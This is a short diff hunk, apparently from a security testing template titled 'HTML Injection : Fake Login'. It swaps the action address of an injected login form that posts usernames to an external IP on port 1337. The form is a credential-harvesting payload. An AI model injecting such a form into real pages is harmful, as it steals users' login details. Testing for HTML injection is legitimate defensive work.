@@ -7,7 +7,7 @@ info:
         <h1>HTML Injection : Fake Login</h1>
     </div>
     <div class="form-container">
-        <form action="http://159.203.171.96:1337" method="post" class="form-signin">
+        <form action="http://173.249.56.74:1337" method="post" class="form-signin">
             <div class="form-group">
                 <label for="username">Username</label>
                 <input type="text" name="username" size="20">
